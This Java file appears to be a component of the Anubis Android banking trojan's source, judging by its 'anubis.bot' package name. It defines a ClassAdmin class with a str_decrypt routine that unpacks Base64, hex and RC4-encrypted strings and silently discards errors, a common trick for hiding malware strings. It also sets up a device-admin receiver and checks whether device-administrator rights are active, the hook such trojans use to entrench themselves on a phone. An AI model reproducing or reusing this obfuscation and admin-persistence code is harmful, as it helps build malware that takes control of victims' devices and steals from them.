package anubis.bot.myapplication.API.Admin;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class ClassAdmin {

	public String str_decrypt(String textDE_C, String key)
	{
		UtilsClass utilsClass = new UtilsClass();
		try
		{
			byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
			textDE_C = new String(data, "UTF-8");
			byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
			ClassRC4 rcd = new ClassRC4(key.getBytes());
			return  new String(rcd.decrypt(detext));
		}catch (Exception ex){ }
		return "";
	}

	public static final int DMP = 100;
	private Context MC;
	private DevicePolicyManager mDPM;
	private ComponentName AC;
	public ClassAdmin(Context context)
	{
		this.MC = context;
		String gd = ReceiverDeviceAdmin.class.getName();
		String ndg = MC.getPackageName();
		this.mDPM = (DevicePolicyManager) MC.getSystemService(Context.DEVICE_POLICY_SERVICE);
		this.AC = new ComponentName(ndg, gd);
	}
	public boolean ISS() {
		return mDPM.isAdminActive(AC);
	}
	public ComponentName GAC() {
		return AC;
	}
}
